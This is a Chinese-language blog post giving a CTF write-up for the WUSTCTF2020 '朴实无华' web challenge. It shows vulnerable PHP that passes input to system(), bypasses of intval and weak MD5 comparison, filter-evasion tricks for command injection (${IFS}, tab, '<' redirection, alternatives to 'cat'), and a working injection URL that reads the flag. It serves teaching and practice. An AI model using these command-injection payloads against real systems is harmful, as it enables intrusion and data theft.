<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>[WUSTCTF2020]朴实无华1 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="上来先使用工具dirsearch扫目录 D:\python\dirsearch-master&gt;dirsearch -e txt,bak,zip,tgz -u http:&#x2F;&#x2F;50370053-0d9a-4135-8e46-74ad1f294852.node5.buuoj.cn:81&#x2F; -t 5 –delay 1 [17:24:02] 200 -   227B - &#x2F;index.php">
<meta property="og:type" content="article">
<meta property="og:title" content="[WUSTCTF2020]朴实无华1">
<meta property="og:url" content="http://example.com/2025/10/05/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="上来先使用工具dirsearch扫目录 D:\python\dirsearch-master&gt;dirsearch -e txt,bak,zip,tgz -u http:&#x2F;&#x2F;50370053-0d9a-4135-8e46-74ad1f294852.node5.buuoj.cn:81&#x2F; -t 5 –delay 1 [17:24:02] 200 -   227B - &#x2F;index.php">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-10-05T11:50:49.000Z">
<meta property="article:modified_time" content="2025-10-05T11:51:21.762Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-WUSTCTF2020-朴实无华1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/05/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/" class="article-date">
  <time class="dt-published" datetime="2025-10-05T11:50:49.000Z" itemprop="datePublished">2025-10-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      [WUSTCTF2020]朴实无华1
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>上来先使用工具dirsearch扫目录</p>
<p>D:\python\dirsearch-master&gt;dirsearch -e txt,bak,zip,tgz -u <a target="_blank" rel="noopener" href="http://50370053-0d9a-4135-8e46-74ad1f294852.node5.buuoj.cn:81/">http://50370053-0d9a-4135-8e46-74ad1f294852.node5.buuoj.cn:81/</a> -t 5 –delay 1</p>
<p>[17:24:02] 200 -   227B - &#x2F;index.php<br>[17:24:03] 200 -   227B - &#x2F;index.php&#x2F;login&#x2F;<br>[17:34:47] 200 -    44B - &#x2F;robots.txt</p>
<p>在&#x2F;robots.txt发现:</p>
<p>User-agent: *<br>Disallow: &#x2F;fAke_f1agggg.php</p>
<p>于是访问 &#x2F;fAke_f1agggg.php目录</p>
<p>给出了一个假的flag  flag{this_is_not_flag}</p>
<p>抓包看看</p>
<p>HTTP&#x2F;1.1 200 OK<br>Server: openresty<br>Date: Sun, 05 Oct 2025 10:09:23 GMT<br>Content-Type: text&#x2F;html<br>Content-Length: 22<br>Connection: keep-alive<br>X-Powered-By: PHP&#x2F;5.5.38<br>look_at_me: &#x2F;fl4g.php<br>Cache-Control: no-cache</p>
<p>flag{this_is_not_flag}</p>
<p>关键点在  look_at_me: &#x2F;fl4g.php</p>
<p>访问这个目录</p>
<p>得到源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="title function_ invoke__">highlight_file</span>(__file__);  </span><br><span class="line"><span class="comment">//level 1 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];   </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;     </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;    </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;   <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>); </span><br><span class="line">     &#125; </span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">else</span>    <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;   </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//get flag </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];   </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;   </span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);   </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;     <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;   </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>这段代码有三个绕过:</p>
<h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个:"></a>第一个:</h3><p>if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</p>
<p>intval()函数是将指定数值转换为整数,</p>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li><code>intval()</code> 对 <code>null</code> 转换结果为 <code>0</code></li>
<li>对于非数字开头的字符串（如 <code>&quot;abc123&quot;</code>），结果为 <code>0</code></li>
<li>与 <code>floatval()</code>、<code>strval()</code> 配合可实现不同类型间的灵活转换</li>
</ul>
<h6 id="关键点："><a href="#关键点：" class="headerlink" title="关键点："></a>关键点：</h6><ul>
<li><p><code>intval($num)</code> 会严格按照字符串解析，遇到非数字字符停止</p>
</li>
<li><p><code>$num + 1</code> 会先将 <code>$num</code> 进行<strong>数学转换</strong>，然后再加 1，最后 <code>intval()</code> 取整</p>
<p>num&#x3D;1e4的时候,intval(1e4)&#x3D;1,intval(1e4+1)&#x3D;intval(1001)&#x3D;1001</p>
<p>满足绕过条件</p>
<p>payload:num&#x3D;1e4</p>
<h3 id="第二个"><a href="#第二个" class="headerlink" title="第二个:"></a>第二个:</h3><p>if (isset($_GET[‘md5’])){<br>$md5&#x3D;$_GET[‘md5’];<br>if ($md5&#x3D;&#x3D;md5($md5))</p>
</li>
</ul>
<p>在 PHP 中，MD5 哈希值的 “弱等于比较”（使用 <code>==</code> 运算符）存在安全漏洞，这是由 PHP 的弱类型转换机制导致的。</p>
<h5 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h5><p>当使用 <code>==</code> 比较两个字符串时，PHP 会尝试将它们转换为相同类型后再比较。如果字符串以 <code>0e</code> 开头且后续字符全是数字，PHP 会将其解析为科学计数法 <code>0 × 10^n</code>（结果为 0）。</p>
<p>因此，两个不同的字符串，只要它们的 MD5 哈希值都符合 <code>0e[0-9]+</code> 格式，就会被 <code>==</code> 判断为相等。</p>
<h5 id="完全符合要求的（字符串本身-0e…，MD5-也是-0e…）"><a href="#完全符合要求的（字符串本身-0e…，MD5-也是-0e…）" class="headerlink" title="完全符合要求的（字符串本身 0e…，MD5 也是 0e…）"></a>完全符合要求的（字符串本身 0e…，MD5 也是 0e…）</h5><p>php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;0e215962017&quot; → &quot;0e291242476940776845150308577824&quot;</span><br></pre></td></tr></table></figure>



<p>php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;0e1137126905&quot; → &quot;0e291659922323405260514745084877&quot;</span><br></pre></td></tr></table></figure>



<p>php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;0e665070199&quot; → &quot;0e220288161793147917283599844203&quot;  </span><br></pre></td></tr></table></figure>

<p>payload为md5&#x3D;0e665070199</p>
<h3 id="第三个"><a href="#第三个" class="headerlink" title="第三个:"></a>第三个:</h3><p>if (isset($_GET[‘get_flag’])){<br>    $get_flag &#x3D; $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag &#x3D; str_ireplace(“cat”, “wctf2020”, $get_flag);   </p>
<p>这是一个<strong>命令注入过滤绕过</strong>的场景。代码做了以下限制：</p>
<ol>
<li><strong>不能包含空格</strong>：<code>!strstr($get_flag,&quot; &quot;)</code></li>
<li>**把 “cat” 替换成 “wctf2020”**：<code>str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag)</code></li>
</ol>
<h4 id="1-绕过思路"><a href="#1-绕过思路" class="headerlink" title="1. 绕过思路"></a>1. 绕过思路</h4><h5 id="1-1-空格替代"><a href="#1-1-空格替代" class="headerlink" title="1.1 空格替代"></a>1.1 空格替代</h5><p>不能用空格，但可以用其他空白符：</p>
<ul>
<li><p><strong><code>$&#123;IFS&#125;</code></strong> （最常用）</p>
</li>
<li><p><strong><code>$IFS$9</code></strong></p>
</li>
<li><p><strong><code>&lt;</code></strong> 重定向符号</p>
</li>
<li><p><strong><code>%09</code></strong> （Tab）</p>
</li>
<li><p><strong><code>&#123;cmd,argument&#125;</code></strong> 花括号扩展</p>
<h5 id="1-2-“cat”-过滤绕过"><a href="#1-2-“cat”-过滤绕过" class="headerlink" title="1.2 “cat” 过滤绕过"></a>1.2 “cat” 过滤绕过</h5><ul>
<li><strong>使用其他命令</strong>：<code>tac</code>、<code>more</code>、<code>less</code>、<code>head</code>、<code>tail</code>、<code>nl</code>、<code>awk</code>、<code>sed</code></li>
<li><strong>字符串拼接</strong>：<code>c&#39;&#39;at</code>、<code>c\at</code>、<code>ca$@t</code>、<code>c$a&#123;t</code></li>
<li><strong>编码&#x2F;转义</strong>：<code>c\at</code>、<code>cat$*</code></li>
<li><strong>使用绝对路径</strong>：<code>/bin/cat</code></li>
</ul>
</li>
</ul>
<p>我们先使用ls命令即<a target="_blank" rel="noopener" href="http://2f271f59-a883-47a2-8857-cfbfb60c72e9.node5.buuoj.cn:81/fl4g.php/?num=1e4&md5=0e215962017&get_flag=ls">http://2f271f59-a883-47a2-8857-cfbfb60c72e9.node5.buuoj.cn:81/fl4g.php/?num=1e4&amp;md5=0e215962017&amp;get_flag=ls</a></p>
<p>得到:</p>
<p>404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt</p>
<p>最终payload</p>
<p><a target="_blank" rel="noopener" href="http://2f271f59-a883-47a2-8857-cfbfb60c72e9.node5.buuoj.cn:81/fl4g.php/?num=1e4&md5=0e215962017&get_flag=more%3Cfllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag">http://2f271f59-a883-47a2-8857-cfbfb60c72e9.node5.buuoj.cn:81/fl4g.php/?num=1e4&amp;md5=0e215962017&amp;get_flag=more%3Cfllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</a></p>
<p>获得flag</p>
<p>flag{af5950d4-f464-4dbe-9ad3-981d4d14d6f9}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/05/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/" data-id="cmgdn5uqi0000d0uyebpb1ld3" data-title="[WUSTCTF2020]朴实无华1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2025/10/04/BUUCTF-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World-1-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">BUUCTF [CISCN2019 华北赛区 Day2 Web1]Hack World 1(SQL注入之布尔盲注）</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/05/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/">[WUSTCTF2020]朴实无华1</a>
          </li>
        
          <li>
            <a href="/2025/10/04/BUUCTF-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World-1-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/">BUUCTF [CISCN2019 华北赛区 Day2 Web1]Hack World 1(SQL注入之布尔盲注）</a>
          </li>
        
          <li>
            <a href="/2025/10/03/BJDCTF2020-Mark-loves-cat1-%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95/">[BJDCTF2020]Mark loves cat1--三种解法</a>
          </li>
        
          <li>
            <a href="/2025/10/02/chenge-first-blog/">&#39;chenge-first-blog&#39;</a>
          </li>
        
          <li>
            <a href="/2025/10/02/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>